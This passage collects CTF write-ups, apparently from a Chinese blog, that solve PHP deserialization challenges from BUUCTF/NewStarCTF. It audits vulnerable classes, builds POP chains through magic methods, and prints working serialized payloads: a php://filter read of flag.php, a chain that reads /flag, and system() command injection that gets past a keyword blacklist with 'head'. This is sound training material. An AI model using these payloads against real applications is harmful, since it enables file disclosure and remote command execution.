<font style="color:#000000;">接下来将代码复制到本地 并注释掉一些无关的东西开始构建pop链</font>

```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var="php://filter/read=convert.base64-encode/resource=flag.php";
//    public function append($value){
//        include($value);
//    }
//    public function __invoke(){
//        $this->append($this->var);
//    }
}

class Show{
    public $source;
    public $str;
//    public function __construct($file='index.php'){
//        $this->source = $file;
//        echo 'Welcome to '.$this->source."<br>";
//    }
//    public function __toString(){
//        return $this->str->source;
//    }

//    public function __wakeup(){
//        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
//            echo "hacker";
//            $this->source = "index.php";
//        }
//    }
}

class Test{
    public $p;
//    public function __construct(){
//        $this->p = array();
//    }
//
//    public function __get($key){
//        $function = $this->p;
//        return $function();
//    }
}

//if(isset($_GET['pop'])){
//    @unserialize($_GET['pop']);
//}
//else{
//    $a=new Show;
//    highlight_file(__FILE__);
$a=new Show();
$a->source=new Show();
$a->source->str=new Test();
$a->source->str->p=new Modifier();
echo urlencode(serialize($a));
```

运行得到pop链

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732848347234-66b63d0d-f17d-47c6-aa17-dc2417088068.png)

上传参数pop

```php
?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
```

得到一段密文 解码后获得flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732848437711-63e6678b-6d5e-411b-96e3-54d9f113e822.png)

## ![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732848467271-2c1c3756-b117-4c5b-a2db-2197cef02453.png)
## BUUCTF [NewStarCTF 公开赛赛道]UnserializeOne
代码如下

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start{
    public $name;
    protected $func;

    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }

    public function __isset($var)
    {
        ($this->func)();
    }
}

class Sec{
    private $obj;
    private $var;

    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }

    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

class Easy{
    public $cla;

    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

class eeee{
    public $obj;

    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}

if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}

```

通过代码审计我们发现在Sec类中存在输出flag的函数

```php
class Sec{
    private $obj;
    private $var;

    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }

    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}
```

由于要触发魔术方法<font style="color:#601BDE;">__invoke</font>所以需要将对象当成函数来调用

接着我们发现Start类中存在将对象当成函数调用

```php
class Start{
    public $name;
    protected $func;

    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }

    public function __isset($var)
    {
        ($this->func)();
    }
}
```

所以我们有<font style="color:#601BDE;">func=new Sec; </font><font style="color:#000000;">所以我们还要寻找触发</font><font style="color:#601BDE;">__isset()</font><font style="color:#000000;">魔术方法的方法</font>

<font style="color:#000000;">由于</font><font style="color:#601BDE;">__isset()魔术方法</font><font style="color:#000000;">当对不可访问属性调用isset()或empty()时触发</font>

<font style="color:#000000;">于是我们发现eeee类中存在isset</font>

```php
class eeee{
    public $obj;

    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}
```

所以我们接着有<font style="color:#601BDE;">obj=new Start;</font><font style="color:#000000;">接着我们需要寻找触发</font><font style="color:#601BDE;">__clone</font><font style="color:#000000;">的魔术方法</font>

<font style="color:#000000;">由于</font><font style="color:#601BDE;">__clone</font><font style="color:#000000;">魔术方法在使用clone关键字拷贝完一个对象后触发 所以我们接着发现Easy类中发现存在clone函数</font>

```php
class Easy{
    public $cla;

    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}
```

<font style="color:#000000;"> 所以我们接着有 </font><font style="color:#601BDE;">var=new eeee；</font><font style="color:#000000;">接着我们要寻找触发</font><font style="color:#601BDE;">__call</font><font style="color:#000000;">魔术方法的方法</font>

<font style="color:#000000;">由于</font><font style="color:#601BDE;">__call</font><font style="color:#000000;">魔术方法在调用对象不可访问、不存在的方法时触发 所以我们接着发现Sec类中</font>

```php
public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }
```

所以我们有<font style="color:#601BDE;">obj=new Easy; </font><font style="color:#000000;">接着我们要寻找触发</font><font style="color:#601BDE;">__toString</font><font style="color:#000000;">魔术方法的方法 接着发现Start类中</font>

```php
class Start{
    public $name;
    protected $func;

    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }
}
```

所以我们有<font style="color:#601BDE;">name=new Start; </font><font style="color:#000000;">得到大概思路</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732861712467-47c4acf4-770d-4bca-85b3-c3ad380dde40.png)

接着把代码复制到本地 注释掉无关的代码 构建payload

```php
<?php
//error_reporting(0);
//highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start{
    public $name;
    public $func;

//    public function __destruct()
//    {
//        echo "Welcome to NewStarCTF, ".$this->name;
//    }
//
//    public function __isset($var)
//    {
//        ($this->func)();
//    }
}

class Sec{
    public $obj;
    public $var;

//    public function __toString()
//    {
//        $this->obj->check($this->var);
//        return "CTFers";
//    }
//
//    public function __invoke()
//    {
//        echo file_get_contents('/flag');
//    }
}

class Easy{
    public $cla;

//    public function __call($fun, $var)
//    {
//        $this->cla = clone $var[0];
//    }
}

class eeee{
    public $obj;

//    public function __clone()
//    {
//        if(isset($this->obj->cmd)){
//            echo "success";
//        }
//    }
}

//if(isset($_POST['pop'])){
//    unserialize($_POST['pop']);
//}
$a=new Start;
$a->name=new Sec;
$a->name->obj=new Easy;
$a->name->var=new eeee;
$a->name->var->obj=new Start;
$a->name->var->obj->func=new Sec;
echo serialize($a);
```

运行获得pop链

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732866119628-14af23ca-8132-4462-8129-7e8c7d446388.png)

上传参数payload

```php
pop=O:5:"Start":2:{s:4:"name";O:3:"Sec":2:{s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}s:3:"var";O:4:"eeee":1:{s:3:"obj";O:5:"Start":2:{s:4:"name";N;s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}}}}s:4:"func";N;}
```

最后获得flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732866213819-9286829d-685a-4a27-91a9-9a56c7edf635.png)

## BUUCTF  [NewStarCTF 2023 公开赛道]Unserialize？
代码如下

```php
 <?php
highlight_file(__FILE__);
// Maybe you need learn some knowledge about deserialize?
class evil {
    private $cmd;

    public function __destruct()
    {
        if(!preg_match("/cat|tac|more|tail|base/i", $this->cmd)){
            @system($this->cmd);
        }
    }
}

@unserialize($_POST['unser']);
?> 
```

代码审计发现evil类中的__destruct方法内存在system函数漏洞

于是把代码复制到本地 将需要执行的命令赋值给cmd

先输入命令 <font style="color:#601BDE;">ls /</font>

```php
<?php
//highlight_file(__FILE__);
// Maybe you need learn some knowledge about deserialize?
class evil {
    public $cmd="ls /";

//    public function __destruct()
//    {
//        if(!preg_match("/cat|tac|more|tail|base/i", $this->cmd)){
//            @system($this->cmd);
//        }
//    }
}
$a=new evil();
echo serialize($a);
//@unserialize($_POST['unser']);
?>
```

接着传入参数

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732941294102-f40a944b-aa1f-4119-874a-6a556e55f775.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732941308271-76cdab20-9b4c-4103-8a0f-815621449c75.png)

发现根目录下储存在类似于flag的文件 

由于这里过滤了许多可以查看读取flag的关键字 所以我们这里使用head 所以给cmd赋值

```php
cmd="head /th1s_1s_fffflllll4444aaaggggg"
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732941538396-845809f8-b7c4-40ff-aaaa-4baadab522b6.png)

传参

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732941591053-31eb6288-a911-4d19-ae9e-34811405ab68.png)

得到flag

